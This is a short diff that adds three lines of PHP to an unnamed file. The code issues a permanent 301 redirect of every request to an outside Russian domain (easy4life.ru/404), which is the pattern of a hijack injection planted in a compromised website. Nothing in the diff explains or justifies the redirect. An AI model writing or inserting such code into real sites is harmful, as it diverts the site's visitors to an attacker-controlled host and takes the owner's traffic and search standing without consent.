@@ -1,0 +1,3 @@
+$host = $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+if($host == 'easy4life.ru/404') 
+{ } else { header( 'Location: http://easy4life.ru/404', true, 301 );  }
